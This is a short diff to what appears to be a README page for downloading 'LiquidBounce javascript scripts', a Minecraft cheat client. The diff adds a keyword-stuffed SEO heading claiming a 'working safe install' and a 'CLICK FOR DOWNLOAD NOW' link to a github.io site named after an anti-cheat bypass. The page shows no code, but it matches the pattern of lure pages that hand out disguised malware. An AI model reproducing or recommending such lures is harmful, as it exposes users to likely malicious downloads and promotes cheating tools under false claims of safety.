@@ -1,10 +1,10 @@
-
+# download liquidbounce javascript scripts for Windows | working safe install liquidbounce javascript scripts. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-watchdog-byp-jt63.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
